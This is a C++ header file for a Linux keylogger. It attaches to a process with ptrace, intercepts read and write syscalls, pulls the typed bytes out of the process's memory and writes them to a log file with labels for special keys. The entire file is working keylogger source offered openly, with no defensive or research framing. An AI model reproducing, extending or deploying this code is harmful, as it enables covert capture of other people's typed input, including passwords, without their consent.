#ifndef KEYLOGGER_TRACER_HPP
#define KEYLOGGER_TRACER_HPP

#include <sys/ptrace.h>
#include <fcntl.h>
#include <zconf.h>
#include <wait.h>
#include <ctype.h>

#define _offsetof(a, b) __builtin_offsetof(a,b)
#define get_reg(child, name) __get_reg(child, _offsetof(struct user, regs.name))

#define eax rax
#define orig_eax orig_rax
#define SYSCALL_write 1
#define SYSCALL_read 0

long __get_reg(pid_t child, int off) {
    long val = ptrace(PTRACE_PEEKUSER, child, off);
    assert(errno == 0);
    return val;
}

long get_syscall_arg(pid_t child, int which) {
    switch (which) {
#ifdef __amd64__
        case 0: return get_reg(child, rdi);
        case 1: return get_reg(child, rsi);
        case 2: return get_reg(child, rdx);
        case 3: return get_reg(child, r10);
        case 4: return get_reg(child, r8);
        case 5: return get_reg(child, r9);
#else
        case 0: return get_reg(child, ebx);
        case 1: return get_reg(child, ecx);
        case 2: return get_reg(child, edx);
        case 3: return get_reg(child, esi);
        case 4: return get_reg(child, edi);
        case 5: return get_reg(child, ebp);
#endif
        default: return -1;
    }
}

char *read_memory(pid_t child, unsigned long addr, long len) {
    char *val = nullptr;
    long read = 0;
    unsigned long tmp = 0;

    if (len + sizeof(unsigned long) + 1 < len)
        return nullptr;
    val = (char *) calloc(len + sizeof(unsigned long) + 1, 1);
    if (!val)
        return nullptr;

    while (read < len) {
        tmp = ptrace(PTRACE_PEEKDATA, child, addr + read);
        if (errno != 0) {
            val[read] = 0;
            break;
        }
        memcpy(val + read, &tmp, sizeof(tmp));
        read += sizeof(tmp);
    }
    return val;
}

char *extract_write_string(pid_t traced_process, long length) {
    char *strval = nullptr;
    long str_ptr = 0;
    str_ptr = get_syscall_arg(traced_process, 1);
    strval = read_memory(traced_process, str_ptr, length);
    return strval;
}

int wait_for_syscall(pid_t child) {
    int status = -1;
    while(true) {
        ptrace(PTRACE_SYSCALL, child, NULL, NULL);
        waitpid(child, &status, 0);

        if (WIFSTOPPED(status) && WSTOPSIG(status) & 0x80) {
            return 0;
        }

        if (WIFSTOPPED(status)) {
            kill(child, WSTOPSIG(status));
            return 1;
        }

        if (WIFEXITED(status)) {
            return 1;
        }
    }
}

int get_syscall(pid_t traced_process) {
    int num = 0;
    num = get_reg(traced_process, orig_eax);
    assert(errno == 0);
    return num;
}

void find_data_to_log(char *memory, unsigned long len, FILE *fd) {
    if(len <= 4){
        if(memory[0] == 0x20) {
            DEBUG_STDOUT("[SPACE]");
            std::string s = "[SPACE]";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else if(memory[0] == 0x7F) {
            DEBUG_STDOUT("[BACKSPACE]");
            std::string s = "[BACKSPACE]";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else if(memory[0] == 0x09) {
            DEBUG_STDOUT("[TAB]");
            std::string s = "[TAB]";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else if(memory[0] == 0x0D) {
            DEBUG_STDOUT("[ENTER_NUM]\n");
            std::string s = "[ENTER_NUM]\n";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else if(memory[0] == 0x03) {
            DEBUG_STDOUT("[Ctrl+C]");
            std::string s = "[Ctrl+C]";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else if(memory[0] == 0x04) {
            DEBUG_STDOUT("[Ctrl+D]");
            std::string s = "[Ctrl+D]\n";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else if(memory[0] == 0x0D) {
            DEBUG_STDOUT("[ENTER]");
            std::string s = "[ENTER]\n";
            std::fwrite(s.data(), 1, s.size(), fd);
        }
        else {
            DEBUG_STDOUT(std::to_string(memory[0]));
            std::fwrite(memory, 1, 1, fd);
        }
    }
}

#endif //KEYLOGGER_TRACER_HPP
